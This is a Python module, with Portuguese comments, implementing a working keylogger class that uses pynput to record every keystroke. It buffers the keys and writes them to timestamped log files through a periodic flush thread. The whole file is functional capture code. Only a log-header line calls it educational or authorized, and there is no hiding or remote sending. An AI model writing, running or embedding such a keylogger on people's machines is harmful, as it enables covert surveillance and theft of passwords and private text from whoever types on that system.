from pynput import keyboard
import os
import threading
import time
from datetime import datetime


class KeyloggerEngine:
    def __init__(self, log_dir, flush_size=20, flush_interval=5):
        """
        flush_size: número de caracteres para flush imediato
        flush_interval: tempo máximo (segundos) entre flushes
        """
        self.log_dir = log_dir
        self.flush_size = flush_size
        self.flush_interval = flush_interval

        self.buffer = ""
        self.log_file = None
        self.listener = None
        self.is_running = False

        self._lock = threading.Lock()
        self._flush_thread = None

    # ==================================================
    # ⌨️ Callback de tecla pressionada
    # ==================================================
    def _on_press(self, key):
        if not self.is_running:
            return

        key_repr = self._format_key(key)

        with self._lock:
            self.buffer += key_repr
            if len(self.buffer) >= self.flush_size:
                self._flush_buffer()

    # ==================================================
    # 🔤 Formatação das teclas
    # ==================================================
    def _format_key(self, key):
        try:
            return key.char
        except AttributeError:
            special_keys = {
                keyboard.Key.space: " ",
                keyboard.Key.enter: "\n[ENTER]\n",
                keyboard.Key.backspace: "[BACKSPACE]",
                keyboard.Key.tab: "[TAB]",
                keyboard.Key.esc: "[ESC]"
            }
            return special_keys.get(
                key,
                f"[{str(key).replace('Key.', '').upper()}]"
            )

    # ==================================================
    # 💾 Escrita segura no disco
    # ==================================================
    def _flush_buffer(self):
        if not self.buffer or not self.log_file:
            return

        try:
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(self.buffer)
        except IOError as e:
            print(f"[Keylogger] Erro ao gravar log: {e}")
        finally:
            self.buffer = ""

    # ==================================================
    # ⏱️ Thread de flush periódico (CORREÇÃO)
    # ==================================================
    def _flush_worker(self):
        while self.is_running:
            time.sleep(self.flush_interval)
            with self._lock:
                self._flush_buffer()

    # ==================================================
    # ▶️ Iniciar
    # ==================================================
    def start(self):
        if self.is_running:
            return None

        os.makedirs(self.log_dir, exist_ok=True)

        filename = f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        self.log_file = os.path.join(self.log_dir, filename)

        with open(self.log_file, "w", encoding="utf-8") as f:
            f.write(
                "=== AURA KEYLOGGER (USO EDUCACIONAL / AUTORIZADO) ===\n"
                f"Início: {datetime.now().isoformat()}\n"
                "==================================================\n\n"
            )

        self.is_running = True

        # Listener de teclado
        self.listener = keyboard.Listener(on_press=self._on_press)
        self.listener.start()

        # Thread de flush por tempo
        self._flush_thread = threading.Thread(
            target=self._flush_worker,
            daemon=True
        )
        self._flush_thread.start()

        return self.log_file

    # ==================================================
    # ⏹️ Parar
    # ==================================================
    def stop(self):
        if not self.is_running:
            return

        self.is_running = False

        if self.listener:
            self.listener.stop()

        if self._flush_thread:
            self._flush_thread.join(timeout=2)

        with self._lock:
            self._flush_buffer()

        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write(f"\n\n[FIM] {datetime.now().isoformat()}\n")

